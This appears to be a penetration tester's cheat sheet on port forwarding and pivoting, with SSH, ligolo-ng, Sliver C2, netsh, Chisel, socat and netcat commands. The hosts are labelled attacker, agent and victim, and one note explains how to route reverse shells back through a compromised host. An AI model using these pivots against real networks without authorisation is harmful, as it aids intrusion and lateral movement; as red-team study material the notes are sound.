# Port Forwarding



TODO -> PORT FORWARDING SCENNARIO -> JMPHOST INTERNAL NETWORK

if your port forward doesn't work but you're certain it should: did you check the host firewall? :)

## Local Port Forward

### SSH

```shell
ssh -L LHOST_IF_ADDR:LPORT:RHOST_IP:RPORT root@10.13.37.16 -i root.key -fN
```
`-L`: `[bind_address:]port:host:hostport`
`-fN`: `-f` backgrounds the process immediately. `-N` no shell, only sets up the connection.
the portfwd happens on __your local machine__ -> listening socket will be on __your local machine__  
local port <- remote port  
a local port forward is used to make an application listening on a target machine's localhost, available on your local machine  


### ligolo-ng

TODO
```ligolo-ng
listener_add --tcp --addr 172.16.1.10:61080 --to 10.10.14.14:80
```


### Sliver C2

open the listening socket `127.0.0.1:8080` (ATTCK host) and forward incoming connections to `172.16.139.10:8080` (AGENT host):  
```sliver
portfwd add -b 127.0.0.1:8080 -r 172.16.139.10:8080
```


## Remote Port Forward

### SSH

```bash
ssh -R RHOST_IF_ADDR:RPORT:LHOST_IP:LPORT root@10.13.37.16 -i root.key -fN
```
`-R [bind_address:]port:host:hostport`
`-fN`: `-f` backgrounds the process immediately. `-N` no shell, only sets up the connection.
portfwd happens on remote machine -> listening socket will be on the remote machine
local port -> remote port
a remote port forward is used to make an application listening on your local machine available on a traget machine
for ex. forward your netcat listener to a target machine's internal network interface so a reverse shell on the internal network can connect back to you via the target host your listener is forwarded to

you need to authenticate as root in order to use a port lower than 1025

in order for remote port forwarding to work using ssh, you have to set GatewayPorts to clientspecified

`/etc/ssh/sshd_config` -> `GatewayPorts clientspecified`
```bash
sed -r 's/(#)(GatewayPorts\ ).*$/\2clientspecified/g' -i /etc/ssh/sshd_config
```
reload the ssh daemon in order to load the new configuration:
```bash
systemctl reload sshd.service
```


### ligolo-ng

```ligolo-ng
listener_add --tcp --addr 172.16.139.10:61080 --to 10.10.14.14:80
```
`172.16.139.10` -> internal host01 ip
`10.10.14.14` -> attacker ip

A host from the internal network can do web downloads from the attacker host through the internal host01 via port 61080 because of this remote port forward.  


### Sliver C2

open the listening socket `172.16.210.3:61080` (AGENT host) and forward incoming connections to `10.10.14.14:61080` (ATTCK host):  
```sliver
rportfwd add -b 172.16.139.10:61080 -r 10.10.14.14:61080
```


### Windows Native Remote Port Fordward

show port forwards
```cmd
netsh interface portproxy show v4tov4
```
remote port forward to connect 172.16.210.3:61080 to 172.16.139.10:61080.  
This means when you connect to 172.16.210.3:61080 your connection will be forwarded to 172.16.139.10:61080  
```cmd
netsh interface portproxy add v4tov4 listenport=61080 listenaddress=172.16.210.3 connectport=61080 connectaddress=172.16.139.10
```
`172.16.210.3` -> `172.16.139.10`


### Windows Native Firewall

allow incoming connection to tcp port 61080 on the host the command is executed on
```cmd
netsh advfirewall firewall add rule name="void_tcp_in_61080" dir=in action=allow protocol=tcp localport=61080
```


### Chisel:

```shell
./chisel server -p 8000 --reverse #Server -- Attacker
./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
```

### Socat:

On victim:

```shell
socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
```

### Netcat:

On victim:

```shell
nc -nlvp 8080 -c "nc localhost 1234"
```
